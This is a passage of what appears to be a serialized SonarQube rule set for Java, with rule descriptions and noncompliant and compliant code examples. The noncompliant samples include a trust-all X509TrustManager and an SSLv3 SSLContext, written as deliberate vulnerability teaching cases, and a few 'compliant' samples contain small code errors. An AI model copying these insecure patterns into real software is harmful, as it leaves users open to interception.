  public class Inner extends Parent {

    public void doTheThing() {
      foo();  // Noncompliant; was Outer.this.foo() intended instead?
      // ...
    }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Parent {
  public void foo() { ... }
}

public class Outer {

  public void foo() { ... }

  public class Inner extends Parent {

    public void doTheThing() {
      super.foo();
      // ...
    }
  }
}
</pre>Z
CODE_SMELL
Ω

java:S1176Æ
javaS1176HPublic types, methods and fields (API) should be documented with Javadoc"MAJOR*java:ª<p>Try to imagine using the standard Java API (Collections, JDBC, IO, ...) without Javadoc. It would be a nightmare, because Javadoc is the only way
to understand of the contract of the API. Documenting an API with Javadoc increases the productivity of the developers consuming it.</p>
<p>On top of a main description for each member of a public API, the following Javadoc elements are required to be described:</p>
<ul>
  <li> Parameters, using <code>@param parameterName</code>. </li>
  <li> Thrown exceptions, using <code>@throws exceptionName</code>. </li>
  <li> Method return values, using <code>@return</code>. </li>
  <li> Generic types, using <code>@param &lt;T&gt;</code>. </li>
</ul>
<p>Furthermore the following guidelines should be followed:</p>
<ul>
  <li> At least 1 line of description. </li>
  <li> All parameters documented with <code>@param</code>, and names should match. </li>
  <li> All checked exceptions documented with <code>@throws</code> </li>
  <li> <code>@return</code> present and documented when not <code>void</code>. </li>
  <li> Placeholders like "TODO", "FIXME", "..." should be avoided. </li>
</ul>
<p>The following public methods and constructors are not taken into account by this rule:</p>
<ul>
  <li> Getters and setters. </li>
  <li> Methods overriding another method (usually decorated with <code>@Override</code>). </li>
  <li> Empty constructors. </li>
  <li> Static constants. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
/**
  * This is a Javadoc comment
  */
public class MyClass&lt;T&gt; implements Runnable {    // Noncompliant - missing '@param &lt;T&gt;'

  public static final DEFAULT_STATUS = 0;    // Compliant - static constant
  private int status;                           // Compliant - not public

  public String message;                  // Noncompliant

  public MyClass() {                         // Noncompliant - missing documentation
    this.status = DEFAULT_STATUS;
  }

  public void setStatus(int status) {  // Compliant - setter
    this.status = status;
  }

  @Override
  public void run() {                          // Compliant - has @Override annotation
  }

  protected void doSomething() {    // Compliant - not public
  }

  public void doSomething2(int value) {  // Noncompliant
  }

  public int doSomething3(int value) {  // Noncompliant
    return value;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
/**
  * This is a Javadoc comment
  * @param &lt;T&gt; the parameter of the class
  */
public class MyClass&lt;T&gt; implements Runnable {

  public static final DEFAULT_STATUS = 0;
  private int status;

  /**
    * This is a Javadoc comment
    */
  public String message;

  /**
   * Class comment...
   */
  public MyClass() {
    this.status = DEFAULT_STATUS;
  }

  public void setStatus(int status) {
    this.status = status;
  }

  @Override
  public void run() {
  }

  protected void doSomething() {
  }

  /**
    * Will do something.
    * @param value the value to be used
    */
  public void doSomething(int value) {

  /**
    *  {@inheritDoc}
    */
  public int doSomething(int value) {
    return value;
  }
}
</pre>Z
CODE_SMELL
î

java:S2142Ö
javaS2142,"InterruptedException" should not be ignored"MAJOR*java:µ<p><code>InterruptedExceptions</code> should never be ignored in the code, and simply logging the exception counts in this case as "ignoring". The
throwing of the <code>InterruptedException</code> clears the interrupted state of the Thread, so if the exception is not handled properly the fact
that the thread was interrupted will be lost. Instead, <code>InterruptedExceptions</code> should either be rethrown - immediately or after cleaning up
the method's state - or the thread should be re-interrupted by calling <code>Thread.interrupt()</code> even if this is supposed to be a
single-threaded application. Any other course of action risks delaying thread shutdown and loses the information that the thread was interrupted -
probably without finishing its task.</p>
<p>Similarly, the <code>ThreadDeath</code> exception should also be propagated. According to its JavaDoc:</p>
<blockquote>
  <p>If <code>ThreadDeath</code> is caught by a method, it is important that it be rethrown so that the thread actually dies.</p>
</blockquote>
<h2>Noncompliant Code Example</h2>
<pre>
public void run () {
  try {
    while (true) {
      // do stuff
    }
  }catch (InterruptedException e) { // Noncompliant; logging is not enough
    LOGGER.log(Level.WARN, "Interrupted!", e);
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void run () {
  try {
    while (true) {
      // do stuff
    }
  }catch (InterruptedException e) {
    LOGGER.log(Level.WARN, "Interrupted!", e);
    // Restore interrupted state...
    Thread.currentThread().interrupt();
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/391.html">MITRE, CWE-391</a> - Unchecked Error Condition </li>
  <li> <a href="https://www.ibm.com/developerworks/java/library/j-jtp05236/index.html?ca=drs-#2.1">Dealing with InterruptedException</a> </li>
</ul>ZBUG
Å

java:S2143Ú
javaS21436"java.time" classes should be used for dates and times"MAJOR*java:ë<p>The old, much-derided <code>Date</code> and <code>Calendar</code> classes have always been confusing and difficult to use properly, particularly in
a multi-threaded context. <code>JodaTime</code> has long been a popular alternative, but now an even better option is built-in. Java 8's JSR 310
implementation offers specific classes for:</p>
<table>
  <tbody>
    <tr>
      <th>Class</th>
      <th>Use for</th>
    </tr>
    <tr>
      <td>LocalDate</td>
      <td>a date, without time of day, offset, or zone</td>
    </tr>
    <tr>
      <td>LocalTime</td>
      <td>the time of day, without date, offset, or zone</td>
    </tr>
    <tr>
      <td>LocalDateTime</td>
      <td>the date and time, without offset, or zone</td>
    </tr>
    <tr>
      <td>OffsetDate</td>
      <td>a date with an offset such as +02:00, without time of day, or zone</td>
    </tr>
    <tr>
      <td>OffsetTime</td>
      <td>the time of day with an offset such as +02:00, without date, or zone</td>
    </tr>
    <tr>
      <td>OffsetDateTime</td>
      <td>the date and time with an offset such as +02:00, without a zone</td>
    </tr>
    <tr>
      <td>ZonedDateTime</td>
      <td>the date and time with a time zone and offset</td>
    </tr>
    <tr>
      <td>YearMonth</td>
      <td>a year and month</td>
    </tr>
    <tr>
      <td>MonthDay</td>
      <td>month and day</td>
    </tr>
    <tr>
      <td>Year/MonthOfDay/DayOfWeek/...</td>
      <td>classes for the important fields</td>
    </tr>
    <tr>
      <td>DateTimeFields</td>
      <td>stores a map of field-value pairs which may be invalid</td>
    </tr>
    <tr>
      <td>Calendrical</td>
      <td>access to the low-level API</td>
    </tr>
    <tr>
      <td>Period</td>
      <td>a descriptive amount of time, such as "2 months and 3 days"</td>
    </tr>
  </tbody>
</table>
<h2>Noncompliant Code Example</h2>
<pre>
Date now = new Date();  // Noncompliant
DateFormat df = new SimpleDateFormat("dd.MM.yyyy");
Calendar christmas  = Calendar.getInstance();  // Noncompliant
christmas.setTime(df.parse("25.12.2020"));
</pre>
<h2>Compliant Solution</h2>
<pre>
LocalDate now = LocalDate.now();  // gets calendar date. no time component
LocalTime now2 = LocalTime.now(); // gets current time. no date component
LocalDate christmas = LocalDate.of(2020,12,25);
</pre>Z
CODE_SMELL
º

java:S4449≠
javaS4449+Nullness of parameters should be guaranteed"MAJOR*java:◊<p>When using null-related annotations at global scope level, for instance using <code>javax.annotation.ParametersAreNonnullByDefault</code> (from
JSR-305) at package level, it means that all the parameters to all the methods included in the package will, or should, be considered
Non-<code>null</code>. It is equivalent to annotating every parameter in every method with non-null annotations (such as <code>@Nonnull</code>).</p>
<p>The rule raises an issue every time a parameter could be <code>null</code> for a method invocation, where the method is annotated as forbidding
null parameters.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@javax.annotation.ParametersAreNonnullByDefault
class A {

  void foo() {
    bar(getValue()); // Noncompliant - method 'bar' do not expect 'null' values as parameter
  }

  void bar(Object o) { // 'o' is by contract expected never to be null
    // ...
  }

  @javax.annotation.CheckForNull
  abstract Object getValue();
}
</pre>
<h2>Compliant Solution</h2>
<p>Two solutions are possible: </p>
<ul>
  <li> The signature of the method is correct, and null check should be done prior to the call. </li>
  <li> The signature of the method is not coherent and should be annotated to allow null values being passed as parameter </li>
</ul>
<pre>
@javax.annotation.ParametersAreNonnullByDefault
abstract class A {

  void foo() {
      Object o = getValue();
      if (o != null) {
        bar(); // Compliant - 'o' can not be null
      }
  }

  void bar(Object o) {
    // ...
  }

  @javax.annotation.CheckForNull
  abstract Object getValue();
}
</pre>
<p>or </p>
<pre>
@javax.annotation.ParametersAreNonnullByDefault
abstract class A {

  void foo() {
    bar(getValue());
  }

  void bar(@javax.annotation.Nullable Object o) { // annotation was missing
    // ...
  }

  @javax.annotation.CheckForNull
  abstract Object getValue();
}
</pre>Z
CODE_SMELL
Í

java:S2141€
javaS2141CClasses that don't define "hashCode()" should not be used in hashes"MAJOR*java:Ù<p>Because <code>Object</code> implements <code>hashCode</code>, any Java class can be put into a hash structure. However, classes that define
<code>equals(Object)</code> but not <code>hashCode()</code> aren't truly hash-able because instances that are equivalent according to the
<code>equals</code> method can return different hashes.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Student {  // no hashCode() method; not hash-able
  // ...

  public boolean equals(Object o) {
    // ...
  }
}

public class School {
  private Map&lt;Student, Integer&gt; studentBody = // okay so far
          new HashTable&lt;Student, Integer&gt;(); // Noncompliant

  // ...
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Student {  // has hashCode() method; hash-able
  // ...

  public boolean equals(Object o) {
    // ...
  }
  public int hashCode() {
    // ...
  }
}

public class School {
  private Map&lt;Student, Integer&gt; studentBody = new HashTable&lt;Student, Integer&gt;();

  // ...
</pre>ZBUG
ã

java:S1172¸
javaS1172*Unused method parameters should be removed"MAJOR*java:ß<p>Unused parameters are misleading. Whatever the values passed to such parameters, the behavior will be the same.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void doSomething(int a, int b) {     // "b" is unused
  compute(a);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void doSomething(int a) {
  compute(a);
}
</pre>
<h2>Exceptions</h2>
<p>The rule will not raise issues for unused parameters:</p>
<ul>
  <li> that are annotated with <code>@javax.enterprise.event.Observes</code> </li>
  <li> in overrides and implementation methods </li>
  <li> in interface <code>default</code> methods </li>
  <li> in non-private methods that only <code>throw</code> or that have empty bodies </li>
  <li> in annotated methods, unless the annotation is <code>@SuppressWarning("unchecked")</code> or <code>@SuppressWarning("rawtypes")</code>, in
  which case the annotation will be ignored </li>
  <li> in overridable methods (non-final, or not member of a final class, non-static, non-private), if the parameter is documented with a proper
  javadoc. </li>
</ul>
<pre>
@Override
void doSomething(int a, int b) {     // no issue reported on b
  compute(a);
}

public void foo(String s) {
  // designed to be extended but noop in standard case
}

protected void bar(String s) {
  //open-closed principle
}

public void qix(String s) {
  throw new UnsupportedOperationException("This method should be implemented in subclasses");
}

/**
 * @param s This string may be use for further computation in overriding classes
 */
protected void foobar(int a, String s) { // no issue, method is overridable and unused parameter has proper javadoc
  compute(a);
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>Z
CODE_SMELL
Ô

java:S1171‡
javaS1171-Only static class initializers should be used"MAJOR*java:à<p>Non-static initializers are rarely used, and can be confusing for most developers because they only run when new class instances are created. When
possible, non-static initializers should be refactored into standard constructors or field initializers.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class MyClass {
  private static final Map&lt;String, String&gt; MY_MAP = new HashMap&lt;String, String&gt;() {

    // Noncompliant - HashMap should be extended only to add behavior, not for initialization
    {
      put("a", "b");
    }

  };
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass {
  private static final Map&lt;String, String&gt; MY_MAP = new HashMap&lt;String, String&gt;();

  static {
    MY_MAP.put("a", "b");
  }
}
</pre>
<p>or using Guava:</p>
<pre>
class MyClass {
  // Compliant
  private static final Map&lt;String, String&gt; MY_MAP = ImmutableMap.of("a", "b");
}
</pre>Z
CODE_SMELL
¥

java:S2260•
javaS2260Java parser failure"MAJOR*java:Á<p>When the Java parser fails, it is possible to record the failure as a violation on the file. This way, not only it is possible to track the number
of files that do not parse but also to easily find out why they do not parse.</p>Z
CODE_SMELL
—

java:S2159¬
javaS2159(Silly equality checks should not be made"MAJOR*java:ˆ<p>Comparisons of dissimilar types will always return false. The comparison and all its dependent code can simply be removed. This includes:</p>
<ul>
  <li> comparing an object with null </li>
  <li> comparing an object with an unrelated primitive (E.G. a string with an int) </li>
  <li> comparing unrelated classes </li>
  <li> comparing an unrelated <code>class</code> and <code>interface</code> </li>
  <li> comparing unrelated <code>interface</code> types </li>
  <li> comparing an array to a non-array </li>
  <li> comparing two arrays </li>
</ul>
<p>Specifically in the case of arrays, since arrays don't override <code>Object.equals()</code>, calling <code>equals</code> on two arrays is the same
as comparing their addresses. This means that <code>array1.equals(array2)</code> is equivalent to <code>array1==array2</code>.</p>
<p>However, some developers might expect <code>Array.equals(Object obj)</code> to do more than a simple memory address comparison, comparing for
instance the size and content of the two arrays. Instead, the <code>==</code> operator or <code>Arrays.equals(array1, array2)</code> should always be
used with arrays.</p>
<h2>Noncompliant Code Example</h2>
<pre>
interface KitchenTool { ... };
interface Plant {...}

public class Spatula implements KitchenTool { ... }
public class Tree implements Plant { ...}
//...

Spatula spatula = new Spatula();
KitchenTool tool = spatula;
KitchenTool [] tools = {tool};

Tree tree = new Tree();
Plant plant = tree;
Tree [] trees = {tree};


if (spatula.equals(tree)) { // Noncompliant; unrelated classes
  // ...
}
else if (spatula.equals(plant)) { // Noncompliant; unrelated class and interface
  // ...
}
else if (tool.equals(plant)) { // Noncompliant; unrelated interfaces
  // ...
}
else if (tool.equals(tools)) { // Noncompliant; array &amp; non-array
  // ...
}
else if (trees.equals(tools)) { // Noncompliant; incompatible arrays
  // ...
}
else if (tree.equals(null)) { // Noncompliant
  // ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/IQAlAg">CERT, EXP02-J.</a> - Do not use the Object.equals() method to compare two
  arrays </li>
</ul>ZBUG
“

java:S1068√
javaS1068)Unused "private" fields should be removed"MAJOR*java:Ô<p>If a <code>private</code> field is declared but not used in the program, it can be considered dead code and should therefore be removed. This will
improve maintainability because developers will not wonder what the variable is used for.</p>
<p>Note that this rule does not take reflection into account, which means that issues will be raised on <code>private</code> fields that are only
accessed using the reflection API.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass {
  private int foo = 42;

  public int compute(int a) {
    return a * 42;
  }

}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyClass {
  public int compute(int a) {
    return a * 42;
  }
}
</pre>
<h2>Exceptions</h2>
<p>The Java serialization runtime associates with each serializable class a version number, called <code>serialVersionUID</code>, which is used during
deserialization to verify that the sender and receiver of a serialized object have loaded classes for that object that are compatible with respect to
serialization.</p>
<p>A serializable class can declare its own <code>serialVersionUID</code> explicitly by declaring a field named <code>serialVersionUID</code> that
must be static, final, and of type long. By definition those <code>serialVersionUID</code> fields should not be reported by this rule:</p>
<pre>
public class MyClass implements java.io.Serializable {
  private static final long serialVersionUID = 42L;
}
</pre>
<p>Moreover, this rule doesn't raise any issue on annotated fields.</p>Z
CODE_SMELL
û

java:S1188è
javaS11880Anonymous classes should not have too many lines"MAJOR*java:¥<p>Anonymous classes are a very convenient and compact way to inject a behavior without having to create a dedicated class. But those anonymous inner
classes should be used only if the behavior to be injected can be defined in a few lines of code, otherwise the source code can quickly become
unreadable.</p>Z
CODE_SMELL
ª

java:S3366¨
javaS3366."this" should not be exposed from constructors"MAJOR*java:”<p>In single-threaded environments, the use of <code>this</code> in constructors is normal, and expected. But in multi-threaded environments, it could
expose partially-constructed objects to other threads, and should be used with caution.</p>
<p>The classic example is a class with a <code>static</code> list of its instances. If the constructor stores <code>this</code> in the list, another
thread could access the object before it's fully-formed. Even when the storage of <code>this</code> is the last instruction in the constructor,
there's still a danger if the class is not <code>final</code>. In that case, the initialization of subclasses won't be complete before
<code>this</code> is exposed.</p>
<p>This rule raises an issue when <code>this</code> is assigned to any globally-visible object in a constructor, and when it is passed to the method
of another object in a constructor</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Monument {

  public static final List&lt;Monument&gt; ALL_MONUMENTS = new ArrayList()&lt;&gt;;
  // ...

  public Monument(String location, ...) {
    ALL_MONUMENTS.add(this);  // Noncompliant; passed to a method of another object

    this.location = location;
    // ...
  }
}
</pre>
<h2>Exceptions</h2>
<p>This rule ignores instances of assigning <code>this</code> directly to a <code>static</code> field of the same class because that case is covered
by S3010.</p>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/aAD1AQ">CERT, TSM01-J.</a> - Do not let the this reference escape during object
  construction </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/7ABQAg">CERT, TSM03-J.</a> - Do not publish partially initialized objects </li>
</ul>Z
CODE_SMELL
ó

java:S1066à
javaS1066,Collapsible "if" statements should be merged"MAJOR*java:±<p>Merging collapsible <code>if</code> statements increases the code's readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (file != null) {
  if (file.isFile() || file.isDirectory()) {
    /* ... */
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (file != null &amp;&amp; isFileOrDirectory(file)) {
  /* ... */
}

private static boolean isFileOrDirectory(File file) {
  return file.isFile() || file.isDirectory();
}
</pre>Z
CODE_SMELL
Ë

java:S1065Ÿ
javaS1065Unused labels should be removed"MAJOR*java:è<p>If a label is declared but not used in the program, it can be considered as dead code and should therefore be removed.</p>
<p>This will improve maintainability as developers will not wonder what this label is used for.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void foo() {
  outer: //label is not used.
  for(int i = 0; i&lt;10; i++) {
    break;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void foo() {
  for(int i = 0; i&lt;10; i++) {
    break;
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>Z
CODE_SMELL
˛

java:S2154Ô
javaS2154cDissimilar primitive wrappers should not be used with the ternary operator without explicit casting"MAJOR*java:Ë<p>If wrapped primitive values (e.g. <code>Integers</code> and <code>Floats</code>) are used in a ternary operator (e.g. <code>a?b:c</code>), both
values will be unboxed and coerced to a common type, potentially leading to unexpected results. To avoid this, add an explicit cast to a compatible
type.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Integer i = 123456789;
Float f = 1.0f;
Number n = condition ? i : f;  // Noncompliant; i is coerced to float. n = 1.23456792E8
</pre>
<h2>Compliant Solution</h2>
<pre>
Integer i = 123456789;
Float f = 1.0f;
Number n = condition ? (Number) i : f;  // n = 123456789
</pre>ZBUG
±	

java:S2273¢	
javaS2273a"wait", "notify" and "notifyAll" should only be called when a lock is obviously held on an object"MAJOR*java:ù<p>By contract, the method <code>Object.wait(...)</code>, <code>Object.notify()</code> and <code>Object.notifyAll()</code> should be called by a
thread that is the owner of the object's monitor. If this is not the case an <code>IllegalMonitorStateException</code> exception is thrown. This rule
reinforces this constraint by making it mandatory to call one of these methods only inside a <code>synchronized</code> method or statement. </p>
<h2>Noncompliant Code Example</h2>
<pre>
private void removeElement() {
  while (!suitableCondition()){
    obj.wait();
  }
  ... // Perform removal
}
</pre>
<p>or</p>
<pre>
private void removeElement() {
  while (!suitableCondition()){
    wait();
  }
  ... // Perform removal
}
</pre>
<h2>Compliant Solution</h2>
<pre>
private void removeElement() {
  synchronized(obj) {
    while (!suitableCondition()){
      obj.wait();
    }
    ... // Perform removal
  }
}
</pre>
<p>or</p>
<pre>
private synchronized void removeElement() {
  while (!suitableCondition()){
    wait();
  }
  ... // Perform removal
}
</pre>ZBUG
“

java:S1181√
javaS1181(Throwable and Error should not be caught"MAJOR*java:<p><code>Throwable</code> is the superclass of all errors and exceptions in Java. <code>Error</code> is the superclass of all errors, which are not
meant to be caught by applications.</p>
<p>Catching either <code>Throwable</code> or <code>Error</code> will also catch <code>OutOfMemoryError</code> and <code>InternalError</code>, from
which an application should not attempt to recover.</p>
<h2>Noncompliant Code Example</h2>
<pre>
try { /* ... */ } catch (Throwable t) { /* ... */ }
try { /* ... */ } catch (Error e) { /* ... */ }
</pre>
<h2>Compliant Solution</h2>
<pre>
try { /* ... */ } catch (RuntimeException e) { /* ... */ }
try { /* ... */ } catch (MyException e) { /* ... */ }
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/396.html">MITRE, CWE-396</a> - Declaration of Catch for Generic Exception </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/BIB3AQ">CERT, ERR08-J.</a> - Do not catch NullPointerException or any of its ancestors
  </li>
</ul>Z
CODE_SMELL
í

java:S4424É
javaS44248TrustManagers should not blindly accept any certificates"MAJOR*java:ù<p>Empty implementations of the <code>X509TrustManager</code> interface are often created to allow connection to a host that is not signed by a root
certificate authority. Such an implementation will accept any certificate, which leaves the application vulnerable to Man-in-the-middle attacks. The
correct solution is to provide an appropriate trust store.</p>
<p>This rule raises an issue when an implementation of <code>X509TrustManager</code> never throws exception.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class TrustAllManager implements X509TrustManager {

    @Override
    public void checkClientTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException {  // Noncompliant, nothing means trust any client
    }

    @Override
    public void checkServerTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException { // Noncompliant, this method never throws exception, it means trust any client
        LOG.log(Level.SEVERE, ERROR_MESSAGE);
    }

    @Override
    public X509Certificate[] getAcceptedIssuers() {
        return null;
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/295.html">MITRE, CWE-295</a> - Improper Certificate Validation </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/VwAZAg">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>
</ul>ZVULNERABILITY
Ñ

java:S3457ı
javaS34574Printf-style format strings should be used correctly"MAJOR*java:ñ<p>Because <code>printf</code>-style format strings are interpreted at runtime, rather than validated by the compiler, they can contain errors that
result in the wrong strings being created. This rule statically validates the correlation of <code>printf</code>-style format strings to their
arguments when calling the <code>format(...)</code> methods of <code>java.util.Formatter</code>, <code>java.lang.String</code>,
<code>java.io.PrintStream</code>, <code>MessageFormat</code>, and <code>java.io.PrintWriter</code> classes and the <code>printf(...)</code> methods of
<code>java.io.PrintStream</code> or <code>java.io.PrintWriter</code> classes. </p>
<h2>Noncompliant Code Example</h2>
<pre>
String.format("First {0} and then {1}", "foo", "bar");  //Noncompliant. Looks like there is a confusion with the use of {{java.text.MessageFormat}}, parameters "foo" and "bar" will be simply ignored here
String.format("Display %3$d and then %d", 1, 2, 3);   //Noncompliant; the second argument '2' is unused
String.format("Too many arguments %d and %d", 1, 2, 3);  //Noncompliant; the third argument '3' is unused
String.format("First Line\n");   //Noncompliant; %n should be used in place of \n to produce the platform-specific line separator
String.format("Is myObject null ? %b", myObject);   //Noncompliant; when a non-boolean argument is formatted with %b, it prints true for any nonnull value, and false for null. Even if intended, this is misleading. It's better to directly inject the boolean value (myObject == null in this case)
String.format("value is " + value); // Noncompliant
String s = String.format("string without arguments"); // Noncompliant

MessageFormat.format("Result '{0}'.", value); // Noncompliant; String contains no format specifiers. (quote are discarding format specifiers)
MessageFormat.format("Result {0}.", value, value);  // Noncompliant; 2nd argument is not used
MessageFormat.format("Result {0}.", myObject.toString()); // Noncompliant; no need to call toString() on objects

java.util.Logger logger;
logger.log(java.util.logging.Level.SEVERE, "Result {0}.", myObject.toString()); // Noncompliant; no need to call toString() on objects
logger.log(java.util.logging.Level.SEVERE, "Result.", new Exception()); // compliant, parameter is an exception
logger.log(java.util.logging.Level.SEVERE, "Result '{0}'", 14); // Noncompliant - String contains no format specifiers.

org.slf4j.Logger slf4jLog;
org.slf4j.Marker marker;

slf4jLog.debug(marker, "message {}");
slf4jLog.debug(marker, "message", 1); // Noncompliant - String contains no format specifiers.

org.apache.logging.log4j.Logger log4jLog;
log4jLog.debug("message", 1); // Noncompliant - String contains no format specifiers.
</pre>
<h2>Compliant Solution</h2>
<pre>
String.format("First %s and then %s", "foo", "bar");
String.format("Display %2$d and then %d", 1, 3);
String.format("Too many arguments %d %d", 1, 2);
String.format("First Line%n");
String.format("Is myObject null ? %b", myObject == null);
String.format("value is %d", value);
String s = "string without arguments";

MessageFormat.format("Result {0}.", value);
MessageFormat.format("Result '{0}'  =  {0}", value);
MessageFormat.format("Result {0}.", myObject);

java.util.Logger logger;
logger.log(java.util.logging.Level.SEVERE, "Result {0}.", myObject);
logger.log(java.util.logging.Level.SEVERE, "Result {0}'", 14);


org.slf4j.Logger slf4jLog;
org.slf4j.Marker marker;

slf4jLog.debug(marker, "message {}");
slf4jLog.debug(marker, "message {}", 1);

org.apache.logging.log4j.Logger log4jLog;
log4jLog.debug("message {}", 1);
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/wQA1">CERT, FIO47-C.</a> - Use valid format strings </li>
</ul>Z
CODE_SMELL
µ

java:S4423¶
javaS4423)Weak SSL/TLS protocols should not be used"MAJOR*java:œ<p><code>javax.net.ssl.SSLContext.getInstance</code> returns a SSLContext object that implements the specified secure socket protocol. However, older
protocol versions like "SSLv3" have been proven to be insecure.</p>
<p>This rule raises an issue when an <code>SSLContext</code> is created with an insecure protocol version(ie: a protocol different from "TLS", "DTLS",
"TLSv1.2", "DTLSv1.2", "TLSv1.3", "DTLSv1.3").</p>
<p>The recommended value is "TLS" or "DTLS" as it will always use the latest version of the protocol. However an issue will be raised if the bytecode
was compiled with JDK7 or an even older version of JDK because they are not alias for TLSv1.2 and DTLSv1.2 but for weaker protocols.</p>
<p>Note that calling <code>SSLContext.getInstance(...)</code> with "TLSv1.2" or "DTLSv1.2" doesn't prevent protocol version negotiation. For example,
if a client connects with "TLSv1.1" and the server used <code>SSLContext.getInstance("TLSv1.2")</code>, the connection will use "TLSv1.1". It is
possible to enable only specific protocol versions by calling <code>setEnabledProtocols</code> on <code>SSLSocket</code>, <code>SSLServerSocket</code>
or <code>SSLEngine</code>. However this should be rarely needed as clients usually ask for the most secure protocol supported.</p>
<h2>Noncompliant Code Example</h2>
<pre>
context = SSLContext.getInstance("SSLv3"); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
context = SSLContext.getInstance("TLSv1.2");
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/326.html">MITRE, CWE-327</a> - Inadequate Encryption Strength </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/327.html">MITRE, CWE-326</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
  <li> <a href="https://blogs.oracle.com/java-platform-group/diagnosing-tls,-ssl,-and-https">Diagnosing TLS, SSL, and HTTPS</a> </li>
  <li> <a href="https://github.com/ssllabs/research/wiki/SSL-and-TLS-Deployment-Best-Practices#22-use-secure-protocols">SSL and TLS Deployment Best
  Practices - Use secure protocols</a> </li>
</ul>ZVULNERABILITY
ª

java:S2127¨
javaS21276"Double.longBitsToDouble" should not be used for "int""MAJOR*java:“<p><code>Double.longBitsToDouble</code> expects a 64-bit, <code>long</code> argument. Pass it a smaller value, such as an <code>int</code> and the
mathematical conversion into a <code>double</code> simply won't work as anticipated because the layout of the bits will be interpreted incorrectly, as
if a child were trying to use an adult's gloves.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int i = 42;
double d = Double.longBitsToDouble(i);  // Noncompliant
</pre>ZBUG
∂

java:S4425ß
javaS4425E"Integer.toHexString" should not be used to build hexadecimal strings"MAJOR*java:∑<p>Using <code>Integer.toHexString</code> is a common mistake when converting sequences of bytes into hexadecimal string representations. The problem
is that the method trims leading zeroes, which can lead to wrong conversions. For instance a two bytes value of <code>0x4508</code> would be converted
into <code>45</code> and <code>8</code> which once concatenated would give <code>0x458</code>.</p>
<p>This is particularly damaging when converting hash-codes and could lead to a security vulnerability.</p>
<p>This rule raises an issue when <code>Integer.toHexString</code> is used in any kind of string concatenations.</p>
<h2>Noncompliant Code Example</h2>
<pre>
MessageDigest md = MessageDigest.getInstance("SHA-256");
byte[] bytes = md.digest(password.getBytes("UTF-8"));

StringBuilder sb = new StringBuilder();
for (byte b : bytes) {
    sb.append(Integer.toHexString( b &amp; 0xFF )); // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
MessageDigest md = MessageDigest.getInstance("SHA-256");
byte[] bytes = md.digest(password.getBytes("UTF-8"));

StringBuilder sb = new StringBuilder();
for (byte b : bytes) {
    sb.append(String.format("%02X", b));
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/704.html">MITRE, CWE-704</a> - Incorrect Type Conversion or Cast </li>
  <li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#BAD_HEXA_CONVERSION">BAD_HEXA_CONVERSION</a> </li>
</ul>Z
CODE_SMELL
Ä

java:S2123Ò
javaS2123*Values should not be uselessly incremented"MAJOR*java:£<p>A value that is incremented or decremented and then not stored is at best wasted code and at worst a bug.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public int pickNumber() {
  int i = 0;
  int j = 0;

  i = i++; // Noncompliant; i is still zero

  return j++; // Noncompliant; 0 returned
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public int pickNumber() {
  int i = 0;
  int j = 0;

  i++;
  return ++j;
}
</pre>ZBUG
‡

java:S2121—
